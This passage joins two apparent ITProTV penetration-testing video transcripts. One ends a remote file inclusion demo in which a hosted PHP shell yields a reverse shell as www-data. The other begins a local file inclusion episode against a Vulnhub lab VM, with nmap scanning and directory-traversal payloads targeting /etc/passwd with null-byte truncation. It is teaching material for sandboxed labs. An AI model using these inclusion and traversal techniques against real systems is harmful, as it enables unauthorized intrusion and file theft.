--> 00:25:23.437\nsee it's caught Mike's eye.\n\n459\n00:25:23.437 --> 00:25:26.410\nMike, why don't you go ahead and tell\nthe good people what the problem is here.\n\n460\n00:25:26.410 --> 00:25:29.630\n&gt;&gt; Well, it does look like\nthe file extension on that is\n\n461\n00:25:29.630 --> 00:25:30.616\nbeen doubled up\n&gt;&gt; It does.\n\n462\n00:25:30.616 --> 00:25:35.478\n&gt;&gt; You see a .php.php, so somewhere I\nbet you it's trying to add that on for\n\n463\n00:25:35.478 --> 00:25:39.330\nyou, so maybe we didn't need\nto put it in the first place.\n\n464\n00:25:39.330 --> 00:25:41.600\n&gt;&gt; That's the problem,\nat least one of the problems, right?\n\n465\n00:25:41.600 --> 00:25:44.090\nWe know that that is\ndefinitely causing an issue.\n\n466\n00:25:44.090 --> 00:25:47.885\nThe file is not called phpshell.php.php,\n\n467\n00:25:47.885 --> 00:25:52.605\nit's called shell.php,\nso we need to remove\n\n468\n00:25:52.605 --> 00:25:57.450\n.php off of our, so that's why you\nsaw the multiple ones in here.\n\n469\n00:25:57.450 --> 00:26:03.640\nBasically what I did was just copy our php\nfile and just remove the .php on the end.\n\n470\n00:26:03.640 --> 00:26:09.080\nSo when it goes through our post data,\nit adds .php for us.\n\n471\n00:26:09.080 --> 00:26:13.610\nThis is a technique that web\ndevelopers used to make sure that\n\n472\n00:26:13.610 --> 00:26:15.500\nwhat you're sending\nthem is what should be.\n\n473\n00:26:15.500 --> 00:26:17.240\nIt's a validation type of thing.\n\n474\n00:26:17.240 --> 00:26:18.780\nSo we're gonna get around\nthat just by removing .php.\n\n475\n00:26:18.780 --> 00:26:20.390\nSo let's do that.\n\n476\n00:26:20.390 --> 00:26:21.824\nLet's go back to Tamper Data.\n\n477\n00:26:21.824 --> 00:26:25.372\nDuck\\g a\\g duck\\g a\\g, don't need that.\n\n478\n00:26:25.372 --> 00:26:29.345\nLet me, where is,\nit's showing up as Iceweasel.\n\n479\n00:26:29.345 --> 00:26:29.903\nThere we go.\n\n480\n00:26:29.903 --> 00:26:31.860\nLet's click it again.\n\n481\n00:26:33.210 --> 00:26:37.240\nThis time we'll hit tamper again and\n\n482\n00:26:37.240 --> 00:26:42.702\nhttp://192.168.219.146.\n\n483\n00:26:42.702 --> 00:26:49.520\nAnd this time,\nwe'll just say php shell, no .php.\n\n484\n00:26:49.520 --> 00:26:51.270\nAnd that does actually exist.\n\n485\n00:26:51.270 --> 00:26:53.590\nIt's in my web route, okay.\n\n486\n00:26:54.910 --> 00:27:00.790\nGo in, see that it went through,\nstill no show.\n\n487\n00:27:00.790 --> 00:27:02.650\nSo what the heck is going on?\n\n488\n00:27:02.650 --> 00:27:06.743\nThe problem is there's something in the\nconfiguration of my Apache server because\n\n489\n00:27:06.743 --> 00:27:09.442\nif we take a look,\nwe do the var.log and access again.\n\n490\n00:27:09.442 --> 00:27:13.050\nYou'll notice that the request\nwent through correctly this time.\n\n491\n00:27:13.050 --> 00:27:13.870\n&gt;&gt; That looks better.\n\n492\n00:27:13.870 --> 00:27:16.870\n&gt;&gt; But Apache didn't serve it up.\n\n493\n00:27:16.870 --> 00:27:17.970\nOkay, that's the problem.\n\n494\n00:27:17.970 --> 00:27:19.600\nSo it's just a configuration\nproblem in my Apache,\n\n495\n00:27:19.600 --> 00:27:21.220\nI'd have to go back in and fix this.\n\n496\n00:27:21.220 --> 00:27:24.180\nI left it purposely, so\nI can show you an easy way if\n\n497\n00:27:24.180 --> 00:27:28.050\nyou don't wanna install Apache as well,\ninstall another web browser.\n\n498\n00:27:28.050 --> 00:27:29.450\nI'm sorry, web server.\n\n499\n00:27:30.490 --> 00:27:33.000\nYou can fire one up with Python very easy,\n\n500\n00:27:33.000 --> 00:27:36.650\na little one liner and\nget a web server going.\n\n501\n00:27:36.650 --> 00:27:42.580\nSo let me show you how to do that,\nI'm going to copy cuz whatever directory\n\n502\n00:27:42.580 --> 00:27:46.770\nyou're in is the one that it's gonna pull\nfrom, it's gonna act as the web route.\n\n503\n00:27:46.770 --> 00:27:49.800\nSo wherever you fire\nthis Python script up at,\n\n504\n00:27:49.800 --> 00:27:53.330\nit's gonna see that working\ndirectory as your web route.\n\n505\n00:27:53.330 --> 00:27:56.570\nSo I'm gonna copy my PHP Shell\ninto this directory.\n\n506\n00:27:56.570 --> 00:28:02.461\nSo copy /var/www/html phpshell to here,\n\n507\n00:28:02.461 --> 00:28:06.030\nI'm gonna copy phpshell.\n\n508\n00:28:08.390 --> 00:28:14.268\nSo now in LS, there's my phpshell and\nall I have to do is say\n\n509\n00:28:14.268 --> 00:28:19.650\npython-m simple http server,\n\n510\n00:28:19.650 --> 00:28:22.930\nlike that, and then give it a port\nnumber that you want it to reside on.\n\n511\n00:28:22.930 --> 00:28:24.776\nI'll say 8888, like that.\n\n512\n00:28:24.776 --> 00:28:32.270\nAnd now I'm serving HTTP on port 8888\nwith a simple one liner from Python.\n\n513\n00:28:32.270 --> 00:28:33.240\nLet's try this yet\n\n514\n00:28:33.240 --> 00:28:38.790\none more time and see if things don't\nwork a little more according to our plan.\n\n515\n00:28:39.930 --> 00:28:44.020\nWhere is [INAUDIBLE],\nit looks to give me tampered data first.\n\n516\n00:28:44.020 --> 00:28:49.385\nAll right,\nit's tampered with it lets tell it\n\n517\n00:28:49.385 --> 00:28:55.306\nhttp://192.168.219.146 and\n\n518\n00:28:55.306 --> 00:28:59.570\nthis time, it is on port 8888 and\n\n519\n00:28:59.570 --> 00:29:03.300\n/phpshell like that, hit OK.\n\n520\n00:29:03.300 --> 00:29:05.990\nAll right, fingers crossed ladies and\ngentlemen,\n\n521\n00:29:05.990 --> 00:29:08.620\nhopefully we actually got\nsome action this time.\n\n522\n00:29:08.620 --> 00:29:13.970\n[SOUND] Well, it did,\nactually they got the Git requests and\n\n523\n00:29:13.970 --> 00:29:17.508\nI tried it, but it didn't fire it off.\n\n524\n00:29:17.508 --> 00:29:21.660\nSo we got to better take\na look at some things.\n\n525\n00:29:21.660 --> 00:29:24.920\nOkay, so because hacking is an art and\n\n526\n00:29:24.920 --> 00:29:29.340\nnot just a skill, there are things you\nhave to work around from time to time.\n\n527\n00:29:29.340 --> 00:29:32.064\nAnd I figured out what our problem was,\nyou just take a look at my screen,\n\n528\n00:29:32.064 --> 00:29:32.879\nwe do have shell now.\n\n529\n00:29:32.879 --> 00:29:35.400\nAnd you're like I didn't get to see it.\n\n530\n00:29:35.400 --> 00:29:37.200\nWe'll show it to you again, no problem.\n\n531\n00:29:37.200 --> 00:29:41.090\nBut what happened was as I\nran my simple HTTP server\n\n532\n00:29:42.310 --> 00:29:45.810\nin the root where I copied my PHP shell,\nright.\n\n533\n00:29:45.810 --> 00:29:50.030\nSo I put that in that mail net\ndirectory and then started the server.\n\n534\n00:29:50.030 --> 00:29:52.780\nBut for whatever reason,\nit did not like that file.\n\n535\n00:29:52.780 --> 00:29:56.530\nEven though it was there, all the code\nwas right, it was not serving it up.\n\n536\n00:29:56.530 --> 00:29:57.300\nI don't know why.\n\n537\n00:29:57.300 --> 00:29:59.180\nI've done this a million times.\n\n538\n00:29:59.180 --> 00:30:01.040\nNo good reason I can think of.\n\n539\n00:30:01.040 --> 00:30:03.952\nMy head while should observe that file up,\nbut it didn't, so\n\n540\n00:30:03.952 --> 00:30:07.338\nwhat I did was I change directories\nto where I copied the PHP file from.\n\n541\n00:30:07.338 --> 00:30:09.800\nAnd then re-ran the same exact thing.\n\n542\n00:30:09.800 --> 00:30:12.740\nSo I just started the server there and\n\n543\n00:30:12.740 --> 00:30:15.270\nthen notice down here in our listener,\nwe do have a shell.\n\n544\n00:30:15.270 --> 00:30:17.390\nI'll exit out just so you can see that.\n\n545\n00:30:17.390 --> 00:30:19.110\nAgain, I'm in the wrong prompt.\n\n546\n00:30:19.110 --> 00:30:20.760\nExit, here you go.\n\n547\n00:30:20.760 --> 00:30:25.430\nAnd we'll start tamper data,\nice weasel and you know what else?\n\n548\n00:30:25.430 --> 00:30:28.120\nWe got a nice lovely error\nmessage from doing it, but\n\n549\n00:30:28.120 --> 00:30:32.920\nI just click main cuz I can go to that\ncontent.php, hit tamper yet again.\n\n550\n00:30:32.920 --> 00:30:37.552\nIt was absolutely no different other than\nI changed directories where my web server\n\n551\n00:30:37.552 --> 00:30:39.349\nwas gonna start and that was it.\n\n552\n00:30:39.349 --> 00:30:47.173\nAnd here I did\nhttp://192.16.8.219.146:8888,\n\n553\n00:30:47.173 --> 00:30:52.620\nthat's where that's running and\nthen php.shell.\n\n554\n00:30:52.620 --> 00:30:56.210\nAnd if I fire up my listener yet again.\n\n555\n00:30:57.980 --> 00:30:59.950\nHopefully that goes off,\nI might have missed it.\n\n556\n00:30:59.950 --> 00:31:04.770\nI have to do it one more time, cuz I've\nalready missed my window of opportunity.\n\n557\n00:31:04.770 --> 00:31:06.909\nOne more time, for good measure,\ncuz I want these good people to see it.\n\n558\n00:31:13.931 --> 00:31:14.721\n&gt;&gt; Drum roll please.\n\n559\n00:31:14.721 --> 00:31:15.271\n&gt;&gt; Yeah.\n\n560\n00:31:15.271 --> 00:31:20.587\n[LAUGH] There we go.\n\n561\n00:31:20.587 --> 00:31:23.470\nAnd there it is.\n\n562\n00:31:23.470 --> 00:31:26.470\nNow, you've seen it from start to\nfinish and it was just something up\n\n563\n00:31:26.470 --> 00:31:29.650\nwith that copied file that didn't\nlike it and wasn't showing up.\n\n564\n00:31:29.650 --> 00:31:31.200\nBut change directories,\n\n565\n00:31:31.200 --> 00:31:35.590\nwent into the normal web roots,\nstarted my server, everything went gravy.\n\n566\n00:31:35.590 --> 00:31:36.210\nNow we got shell.\n\n567\n00:31:36.210 --> 00:31:41.000\nFrom here, I can do a who am I and\nit shows that I'm\n\n568\n00:31:41.000 --> 00:31:45.890\nlogged in as www- data which is typically\nthe web server service accounts and\n\n569\n00:31:45.890 --> 00:31:48.540\nI'll have to elevate my\nprivileges from here.\n\n570\n00:31:48.540 --> 00:31:52.880\nBut we were able to get a shell\nwith limited abilities.\n\n571\n00:31:52.880 --> 00:31:54.910\nAnd we can continue hacking on from there.\n\n572\n00:31:54.910 --> 00:31:56.660\n&gt;&gt; Absolutely,\nthat's your foot in the door.\n\n573\n00:31:56.660 --> 00:31:58.550\nAnd the as a hacker or pen tester,\n\n574\n00:31:58.550 --> 00:32:01.930\nour next phase is to escalate privileges,\nright.\n\n575\n00:32:01.930 --> 00:32:03.390\nSo we've got we're in,\n\n576\n00:32:03.390 --> 00:32:06.590\nnow we just gotta figure out how\nwe can bump our privileges up.\n\n577\n00:32:06.590 --> 00:32:10.430\nSo that we can do more damage or\nget further in our penetration tests.\n\n578\n00:32:10.430 --> 00:32:12.880\n&gt;&gt; Good news, Mike, is we're gonna\ndo a show on privilege escalation.\n\n579\n00:32:12.880 --> 00:32:13.410\nSo, [LAUGH]\n&gt;&gt; [LAUGH]\n\n580\n00:32:13.410 --> 00:32:14.186\n&gt;&gt; That will help.\n\n581\n00:32:14.186 --> 00:32:16.220\n&gt;&gt; All right, Daniel, great stuff there.\n\n582\n00:32:16.220 --> 00:32:22.340\nReally in-depth look at how we\ncan perform an RFI remote file,\n\n583\n00:32:22.340 --> 00:32:24.930\ninclude another one of\nthose web app attacks.\n\n584\n00:32:24.930 --> 00:32:25.540\nSo we thank you for\n\n585\n00:32:25.540 --> 00:32:28.780\nthat, we hope everybody out\nthere enjoyed watching this one.\n\n586\n00:32:28.780 --> 00:32:31.870\nSigning off for ITProTV,\nI have been your host Mike Rodrick.\n\n587\n00:32:31.870 --> 00:32:32.640\n&gt;&gt; And I'm Daniel Lowrie.\n\n588\n00:32:32.640 --> 00:32:33.797\n&gt;&gt; And we'll see you next time.\n\n589\n00:32:33.797 --> 00:32:41.588\n[MUSIC]\n\n590\n00:32:41.588 -->

00:00:08.319\n[MUSIC]\n\n4\n00:00:08.319 --> 00:00:10.445\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:10.445 --> 00:00:15.650\n&gt;&gt; Hello, welcome to another\nexciting episode here on ITProTV.\n\n6\n00:00:15.650 --> 00:00:17.430\nI'm your host Mike Rodrick.\n\n7\n00:00:17.430 --> 00:00:19.200\nToday we're doing Penetration Testing.\n\n8\n00:00:19.200 --> 00:00:24.270\nAnd in this episode we're gonna be\nfocusing in on local file inclusion\n\n9\n00:00:24.270 --> 00:00:29.000\nis another one of those web app-based\nattack we've already taken a look at,\n\n10\n00:00:29.000 --> 00:00:30.700\nremote file inclusion?\n\n11\n00:00:30.700 --> 00:00:32.700\nNow we're gonna look at\nlocal file inclusion,\n\n12\n00:00:32.700 --> 00:00:35.900\nhere to explain it to us what it is,\nthe difference and how it works.\n\n13\n00:00:35.900 --> 00:00:39.080\nIs our security expert, Mr. Daniel Lowry.\n\n14\n00:00:39.080 --> 00:00:39.932\nWelcome Daniel.\n\n15\n00:00:39.932 --> 00:00:41.090\n&gt;&gt; Thanks Mike.\nSecurity expert.\n\n16\n00:00:41.090 --> 00:00:43.575\nI like that, sound of that.\n\n17\n00:00:43.575 --> 00:00:45.730\n&gt;&gt; [LAUGH].\n&gt;&gt; Even though it's not true.\n\n18\n00:00:45.730 --> 00:00:47.560\nI know a little something about something,\nright.\n\n19\n00:00:47.560 --> 00:00:50.800\nThat's why we're doing this here,\nlittle series that we've been working on.\n\n20\n00:00:50.800 --> 00:00:53.980\nAnd today, like Mike said, we're gonna\ntake a look at local file inclusion.\n\n21\n00:00:53.980 --> 00:00:56.000\nIf you watched remote file inclusion,\n\n22\n00:00:56.000 --> 00:00:59.880\nyou're gonna be like I kind of think\nI know where you're going with this.\n\n23\n00:00:59.880 --> 00:01:03.060\nIf you didn't, well let me tell you\nwhat a local file inclusion is.\n\n24\n00:01:03.060 --> 00:01:08.920\nIt's basically the ability to use a file\nthat is local to the target machine,\n\n25\n00:01:08.920 --> 00:01:11.530\nas part of an attack, per say.\n\n26\n00:01:11.530 --> 00:01:15.530\nSo if I can upload a file that says,\nhey, reach out and\n\n27\n00:01:15.530 --> 00:01:20.410\nshovel shell to this IP address at\nthis port then it will do that.\n\n28\n00:01:20.410 --> 00:01:22.840\nSo that's what we basically are gonna,\nwant to do.\n\n29\n00:01:22.840 --> 00:01:27.140\nWe want to create an exploit\nthat will include a file that is\n\n30\n00:01:27.140 --> 00:01:31.220\non the system already and\nwhich is malicious code.\n\n31\n00:01:31.220 --> 00:01:36.968\nAnd then execute that malicious code,\ncreating a shell, and that's basically it.\n\n32\n00:01:36.968 --> 00:01:39.550\nSo let's talk about how that works,\nwe saw remove file inclusion and\n\n33\n00:01:39.550 --> 00:01:43.190\nit was basically saying, hey,\nat this URL look for this file.\n\n34\n00:01:43.190 --> 00:01:46.939\nWell inside of a file system we don't\nget to use a URL is right they're,\n\n35\n00:01:46.939 --> 00:01:48.800\nthere local to the system.\n\n36\n00:01:48.800 --> 00:01:52.470\nSo we're gonna try to finagle\nusing directory commands and\n\n37\n00:01:52.470 --> 00:01:56.000\nthings of that nature to try to get it\nto find the file we're looking for and\n\n38\n00:01:56.000 --> 00:01:57.990\ntest to see if that's even possible.\n\n39\n00:01:57.990 --> 00:01:59.930\nBecause, hey, you gotta test to see.\n\n40\n00:01:59.930 --> 00:02:02.040\nYou can't just go, hey,\nremote file inclusions and\n\n41\n00:02:02.040 --> 00:02:03.990\nlocal file inclusions are awesome.\n\n42\n00:02:03.990 --> 00:02:05.130\nI'm going to do it.\n\n43\n00:02:05.130 --> 00:02:08.200\nIf it's not vulnerable to it, then you're\nnot gonna be able to pull this off.\n\n44\n00:02:08.200 --> 00:02:09.440\nSo we have to scan for that.\n\n45\n00:02:09.440 --> 00:02:12.720\n&gt;&gt; Now Daniel, we are looking for a file\nthat might already exist on this server,\n\n46\n00:02:12.720 --> 00:02:15.870\nor are we gonna upload this file, and\nthen try to get it to serve it up.\n\n47\n00:02:15.870 --> 00:02:18.710\n&gt;&gt; Yeah.\nTypically we're going to upload a file\n\n48\n00:02:18.710 --> 00:02:23.970\ninto the system, and then use it as a\nlocal file because it's not allowing us to\n\n49\n00:02:23.970 --> 00:02:27.940\ndo remote file inclusion, so remote file\ninclusions are a whole lot easier because\n\n50\n00:02:27.940 --> 00:02:32.480\nhere, I make the file, it's on my machine,\npoint to it and off to the races, right.\n\n51\n00:02:32.480 --> 00:02:36.350\nHere, we need to actually get\nthat file uploaded somehow.\n\n52\n00:02:36.350 --> 00:02:38.470\nAnd that is where the difficulty lies,\nright.\n\n53\n00:02:38.470 --> 00:02:41.040\nIs how do we get that\nfile onto the system.\n\n54\n00:02:41.040 --> 00:02:43.040\nWe gotta look for some ways,\n\n55\n00:02:43.040 --> 00:02:45.770\ntypically this is through\nan include statement, right?\n\n56\n00:02:45.770 --> 00:02:48.750\nWe talked about including statements\nbefore how they allow them to include\n\n57\n00:02:48.750 --> 00:02:50.140\nfiles on the system.\n\n58\n00:02:50.140 --> 00:02:56.040\nWell if they include a file and\nallow us to change what file that is,\n\n59\n00:02:56.040 --> 00:02:59.840\nwell then we use that and then if there's\nany way for us to upload to the system\n\n60\n00:02:59.840 --> 00:03:05.540\nmaybe the I don't know, maybe there's\nan upload system in place, comment boxes,\n\n61\n00:03:05.540 --> 00:03:10.250\nsomewhere where I can put data onto that\nmachine and then know where that file is.\n\n62\n00:03:10.250 --> 00:03:12.380\nIf I know where that file is,\nI can point to it and\n\n63\n00:03:12.380 --> 00:03:17.300\nsay use that file access logs for\nApache, great way to put it.\n\n64\n00:03:17.300 --> 00:03:21.480\nJust log in, write your code, and put it,\nand now it becomes part of the log.\n\n65\n00:03:21.480 --> 00:03:25.990\nIf I know where that log resides,\nwell then I can use that as my local file.\n\n66\n00:03:25.990 --> 00:03:29.940\nIf I'm able to actually traverse\nthe system and find that.\n\n67\n00:03:29.940 --> 00:03:31.550\nThat's what we're gonna do today.\n\n68\n00:03:31.550 --> 00:03:34.360\nFirst thing we do as always\nremember end map scans so\n\n69\n00:03:34.360 --> 00:03:36.580\nthat we can see what our machines are.\n\n70\n00:03:36.580 --> 00:03:38.970\nLet's find the IP address,\nall that other good stuff.\n\n71\n00:03:38.970 --> 00:03:42.270\nLet's do the Net Discover and\nthen we'll run Nmap, and see what happens.\n\n72\n00:03:42.270 --> 00:03:47.495\nSo Net Discover, Disk cover,\nwow, I'm just so bad at this.\n\n73\n00:03:47.495 --> 00:03:48.216\n&gt;&gt; [LAUGH].\n\n74\n00:03:48.216 --> 00:03:54.859\n&gt;&gt; Let's discovered- I -r for\narrange 168.209.1 and\n\n75\n00:03:54.859 --> 00:04:01.616\nthen forget a period there, [CROSSTALK]\nI want a little backward action.\n\n76\n00:04:01.616 --> 00:04:05.214\nI love that Mike is my third eye.\n\n77\n00:04:05.214 --> 00:04:06.436\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n78\n00:04:06.436 --> 00:04:08.347\n&gt;&gt; I can't, I'm looking at my computer,\n\n79\n00:04:08.347 --> 00:04:09.650\nnot my screen here.\n\n80\n00:04:09.650 --> 00:04:12.270\nAnd then of course, 24,\n4, my IP address range.\n\n81\n00:04:12.270 --> 00:04:16.070\nAll right, let's see, give me the bacon.\n\n82\n00:04:16.070 --> 00:04:16.910\nThere it is 145.\n\n83\n00:04:16.910 --> 00:04:21.380\nNow I know that's there, Ctrl+C that.\n\n84\n00:04:21.380 --> 00:04:28.518\nOn my in maps scanning-a-t4\nevery port in the system and\n\n85\n00:04:28.518 --> 00:04:35.690\nwe will do that on 168.319.145 they said.\n\n86\n00:04:35.690 --> 00:04:38.780\nYeah, 145.\nThere we go.\n\n87\n00:04:38.780 --> 00:04:42.000\nLet's see what comes up,\ncome on, come on, come on.\n\n88\n00:04:42.000 --> 00:04:45.660\nWe got all day there Nmap, even though\nit runs super fast, let's be honest.\n\n89\n00:04:45.660 --> 00:04:46.660\n&gt;&gt; [LAUGH].\n&gt;&gt; It's really not that long.\n\n90\n00:04:46.660 --> 00:04:49.350\nI think the last scan ran like\nseven seconds or something.\n\n91\n00:04:49.350 --> 00:04:51.970\n&gt;&gt; Yeah, the dash A is running\nthrough a few different scripts.\n\n92\n00:04:51.970 --> 00:04:54.110\n&gt;&gt; Yeah, it's not slouching at all.\n\n93\n00:04:54.110 --> 00:04:57.080\nAnd there's some look at that, 16 seconds.\n\n94\n00:04:57.080 --> 00:04:58.385\nThe wait was horrible.\n\n95\n00:04:58.385 --> 00:05:00.480\n&gt;&gt; [LAUGH]\n&gt;&gt; We're just impatient people.\n\n96\n00:05:00.480 --> 00:05:02.882\nI always say, if you want patience,\nbecome a doctor, right?\n\n97\n00:05:02.882 --> 00:05:06.820\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] So we're looking through here,\n\n98\n00:05:06.820 --> 00:05:08.870\nwe see the, that's an interesting thing.\n\n99\n00:05:08.870 --> 00:05:13.650\nWe've got a port open for\nMySQL remote access, like that.\n\n100\n00:05:15.000 --> 00:05:16.300\nPort 80 is open.\n\n101\n00:05:16.300 --> 00:05:18.440\nNo SSH, it's interesting, right?\n\n102\n00:05:18.440 --> 00:05:20.430\nSo I'm not gonna be able to\nuse that as an attack vector.\n\n103\n00:05:20.430 --> 00:05:25.020\nBut 80 is running into serving on\nApache and is a Debian system,\n\n104\n00:05:25.020 --> 00:05:27.380\nand there's the name.\n\n105\n00:05:27.380 --> 00:05:31.360\nYes, lest I forget, where did I get\nthis wonderful VM that we're attacking?\n\n106\n00:05:31.360 --> 00:05:34.840\nWell our good friends at Vulnhub.com have\n\n107\n00:05:34.840 --> 00:05:38.380\nan allowance to use their\nsystem demonstration purposes.\n\n108\n00:05:38.380 --> 00:05:41.250\nSo run after the Vulnhub.com.\n\n109\n00:05:41.250 --> 00:05:46.150\nGrab this particular VMS\nit's called pawn lab.\n\n110\n00:05:46.150 --> 00:05:48.390\nThere's the acronym pawn lab eight in one.\n\n111\n00:05:48.390 --> 00:05:51.985\nSo if you just search your internet for\npawn lab, you will be able to find this\n\n112\n00:05:51.985 --> 00:05:56.830\nVMS downloaded and run it in your virtual\nenvironment, and your virtual box.\n\n113\n00:05:56.830 --> 00:06:01.300\nVMware player, VMware fusion, HyperV\nwhatever you're running, go for it, go for\n\n114\n00:06:01.300 --> 00:06:02.650\nbroken and get that guy up and running.\n\n115\n00:06:02.650 --> 00:06:04.710\nAnd remember always SandBox,\n\n116\n00:06:04.710 --> 00:06:08.260\nno internet access when it comes to\nthese things cuz they're vulnerable and\n\n117\n00:06:08.260 --> 00:06:11.148\nyou don't wanna put that heard up for\nthe world for yourself, right.\n\n118\n00:06:11.148 --> 00:06:11.884\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n119\n00:06:11.884 --> 00:06:16.640\nkeep out of that and\ndefinitely sandbox your stuff, okay.\n\n120\n00:06:16.640 --> 00:06:18.110\nSo now, we know portal is open.\n\n121\n00:06:18.110 --> 00:06:19.270\nMy SQL is open.\n\n122\n00:06:19.270 --> 00:06:23.000\nWe're probably working with some sort\nof web front end with the database in\n\n123\n00:06:23.000 --> 00:06:23.770\nthe back end, right?\n\n124\n00:06:23.770 --> 00:06:26.040\nSo that's might be where we're looking at.\n\n125\n00:06:26.040 --> 00:06:29.250\nSo from here, what I'm gonna do,\nyou know what?\n\n126\n00:06:29.250 --> 00:06:30.778\nI'm just gonna go straight for the kill.\n\n127\n00:06:30.778 --> 00:06:36.220\n[COUGH] Excuse me, I'll open up my\nbrowser, let's just look at the website.\n\n128\n00:06:36.220 --> 00:06:38.463\nIt really gives you a lot of information.\n\n129\n00:06:38.463 --> 00:06:42.130\nSo 192.168.219.145.\n\n130\n00:06:42.130 --> 00:06:47.110\nAnd another very simple\nstraightforward web page,\n\n131\n00:06:47.110 --> 00:06:51.180\ngot a couple of links here home,\nlog in and upload.\n\n132\n00:06:51.180 --> 00:06:55.330\nUpload that's definitely something\nthat has perked my interest.\n\n133\n00:06:55.330 --> 00:06:59.160\nIf we click home,\ntakes us here really special.\n\n134\n00:06:59.160 --> 00:07:02.120\nLogin I am if,\nI can't hover with my mouse obviously but\n\n135\n00:07:02.120 --> 00:07:04.210\nin the bottom left hand\ncorner of my screen.\n\n136\n00:07:04.210 --> 00:07:07.190\nActually watch this\n[LAUGH] right around here,\n\n137\n00:07:07.190 --> 00:07:11.150\nyou'll see that it's actually\nshowing me what page we're going to,\n\n138\n00:07:11.150 --> 00:07:18.140\nthat's good information, and then upload\nand so if I click home nothing logged in.\n\n139\n00:07:18.140 --> 00:07:21.890\nTypically, username-password type\nlog in prompt and then upload.\n\n140\n00:07:21.890 --> 00:07:24.220\nIt says, you must be log in.\n\n141\n00:07:24.220 --> 00:07:25.220\nIt must be logged in.\n\n142\n00:07:25.220 --> 00:07:27.110\n[LAUGH] But what can you say,\n\n143\n00:07:27.110 --> 00:07:30.170\nI'm not gonna despair these people for\ntheir bad grammar on this.\n\n144\n00:07:30.170 --> 00:07:31.210\nCuz they're allowing us to use it.\n\n145\n00:07:31.210 --> 00:07:32.645\nSo thank you so much.\n\n146\n00:07:32.645 --> 00:07:33.230\n&gt;&gt; [LAUGH]\n&gt;&gt; All right.\n\n147\n00:07:33.230 --> 00:07:35.000\nSo where do we begin?\n\n148\n00:07:35.000 --> 00:07:40.618\nWe do like to look at code,\nlet's see here.\n\n149\n00:07:40.618 --> 00:07:43.286\nLet's take a look if I go to login,\n\n150\n00:07:43.286 --> 00:07:48.254\nif you up here in the browser address\narea the URL area you see this\n\n151\n00:07:48.254 --> 00:07:53.409\npage=login that is something that\nyou want to keep an eye out for.\n\n152\n00:07:53.409 --> 00:08:00.036\nThis is an indication that an RFI might,\nI'm sorry, LFI might be possible.\n\n153\n00:08:00.036 --> 00:08:04.370\nOkay, because it's saying\nthis page equals log in.\n\n154\n00:08:04.370 --> 00:08:09.520\nSo there's a page called log in and\nit's including that into the link.\n\n155\n00:08:09.520 --> 00:08:13.830\nSo when I click the link, it looks for\nthat page and then delivers it instead of\n\n156\n00:08:13.830 --> 00:08:18.900\nobfuscating that or sanitizing that\nsomehow or doing it a different way,\n\n157\n00:08:18.900 --> 00:08:21.140\nthey just straight up put it and\nyou'll see this a lot.\n\n158\n00:08:21.140 --> 00:08:24.880\nSo I'm not definitely,\nI've got an upload page.\n\n159\n00:08:24.880 --> 00:08:26.460\nMan, there's some prime attack.\n\n160\n00:08:26.460 --> 00:08:28.405\nObviously we're doing it,\nit is vulnerable.\n\n161\n00:08:28.405 --> 00:08:33.010\n[LAUGH] Otherwise it's gonna be a boring\nshow, of us not getting anywhere, right?\n\n162\n00:08:33.010 --> 00:08:37.800\nBut that is definitely something\nyou wanna raise an eyebrow to for\n\n163\n00:08:37.800 --> 00:08:43.620\nan LFI type of attack,\nthat that page equals something is there.\n\n164\n00:08:44.810 --> 00:08:51.040\nSo let's see here, let's try some\ngood old fashioned LFIs and that\n\n165\n00:08:51.040 --> 00:08:55.710\nyou can just type into the URL and you can\nsee if you can get any kind of results.\n\n166\n00:08:55.710 --> 00:08:59.300\nSo what you can do is you can say\ninstead of page equals login,\n\n167\n00:08:59.300 --> 00:09:04.540\nI'm gonna say page=../../../../../../../,\njust adding enough ../'s\n\n168\n00:09:04.540 --> 00:09:09.470\nthat this is basically\na directory traversal maneuver.\n\n169\n00:09:09.470 --> 00:09:13.710\nI'm trying to back up out of\nthe directory to the root so\n\n170\n00:09:13.710 --> 00:09:18.070\nthat I can then move to the directory\ntoward out etsy password file.\n\n171\n00:09:18.070 --> 00:09:20.370\nCuz that's a file I know it exists, and\n\n172\n00:09:20.370 --> 00:09:25.276\nyou can at least read it maybe depending\nif this thing has the correct permissions.\n\n173\n00:09:25.276 --> 00:09:30.460\nSo let's do etsy/passwd.\n\n174\n00:09:30.460 --> 00:09:34.018\nLet's see if that gives\nus any kind of action.\n\n175\n00:09:34.018 --> 00:09:37.210\nNothing is happening, so\nI'm not saying they output the file\n\n176\n00:09:37.210 --> 00:09:41.520\nI'm not getting kinda errors, so it's\nsanitizing that data correctly, right?\n\n177\n00:09:41.520 --> 00:09:45.160\nSo even though that page\nequals login is there\n\n178\n00:09:45.160 --> 00:09:49.720\ngoing through the URL right here\nis not giving me any other ghost.\n\n179\n00:09:49.720 --> 00:09:54.100\nNow sometimes like we saw before maybe\nits adding something to the end of\n\n180\n00:09:54.100 --> 00:09:59.130\nthe URL string so we can kind of\nnegate that by doing a percent,\n\n181\n00:09:59.130 --> 00:10:01.400\nI think it's 20 like that.\n\n182\n00:10:01.400 --> 00:10:03.710\nAnd basically saying and\nwe're done, right?\n\n183\n00:10:03.710 --> 00:10:05.030\nNothing after this.\n\n184\n00:10:05.030 --> 00:10:07.300\nSo even if the website try\nto add something to it,\n\n185\n00:10:07.300 --> 00:10:08.650\nthat %20 will chop it off.\n\n186\n00:10:10.210 --> 00:10:11.335\nOr is the %00.\n\n187\n00:10:11.335 --> 00:10:12.300\nI think %00.\n\n188\n00:10:13.310 --> 00:10:15.030\nSo out of my mind here.\n\n189\n00:10:15.030 --> 00:10:16.900\n%00 so no bytes.\n\n190\n00:10:16.900 --> 00:10:18.470\nHere we go, but still nothing.\n\n191\n00:10:18.470 --> 00:10:20.411\nGot nothing with the 20,\ngot nothing with this.\n\n192\n00:10:20.411 --> 00:10:21.527\nThis is going nowhere far.\n\n193\n00:10:21.527 --> 00:10:27.548\nSo I know that at least through the URL\non this server I'm not getting anywhere.\n\n194\n00:10:27.548 --> 00:10:33.173\nIf I saw the etsy password\nfile displayed in the webpage.\n\n195\n00:10:33.173 --> 00:10:37.659\nAll right, I would say great, that means\nI'll go look for file inclusion and\n\n196\n00:10:37.659 --> 00:10:40.780\nI can use the web URL to attack this box.\n\n197\n00:10:40.780 --> 00:10:41.929\nWe're not so lucky here.\n\n198\n00:10:41.929 --> 00:10:45.577\nSo we're gonna have to continue\nmoving on and see 